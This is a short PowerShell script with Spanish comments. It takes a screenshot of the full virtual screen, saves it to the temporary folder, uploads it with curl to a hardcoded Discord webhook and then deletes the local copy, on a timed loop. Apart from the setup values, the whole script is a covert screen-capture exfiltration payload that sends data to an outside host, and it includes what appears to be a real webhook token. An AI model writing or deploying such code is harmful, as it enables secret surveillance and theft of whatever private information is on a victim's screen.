# Define la URL del webhook
$webhookUrl = "https://discord.com/api/webhooks/1203343432970539008/JjFQGyK8MZw2qySfc4jYTPw0jzsH2HKaKAaaQ27uyrllfMIVaDqEUi_ZywclJBmWpxJp"

# Define el intervalo de tiempo entre capturas de pantalla
$intervaloCapturas = 30

# Define la cantidad de capturas de pantalla a realizar
$cantidadCapturas = 1

# Función para realizar capturas de pantalla y enviar al webhook
function CapturarYEnviar {
    $FileTemp = "$env:TEMP\SC.png"
    Add-Type -AssemblyName System.Windows.Forms
    Add-type -AssemblyName System.Drawing
    $Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
    $Width = $Screen.Width
    $Height = $Screen.Height
    $Left = $Screen.Left
    $Top = $Screen.Top
    $Bitmap = New-Object System.Drawing.Bitmap $Width, $Height
    $Graphic = [System.Drawing.Graphics]::FromImage($Bitmap)
    $Graphic.CopyFromScreen($Left, $Top, 0, 0, $Bitmap.Size)
    $Bitmap.Save($FileTemp, [System.Drawing.Imaging.ImageFormat]::Png)

    # Envía la captura de pantalla al webhook
    curl.exe -F "file1=@$FileTemp" $webhookUrl

    # Elimina el archivo temporal
    Remove-Item -Path $FileTemp
}

# Función para ejecutar el ciclo de captura y envío de manera automática
function EjecutarCiclo {
    $counter = 0
    while ($counter -lt $cantidadCapturas) {
        CapturarYEnviar
        Start-Sleep -Seconds $intervaloCapturas
        $counter++
    }
}

# Ejecuta el ciclo de captura y envío de manera automática
EjecutarCiclo
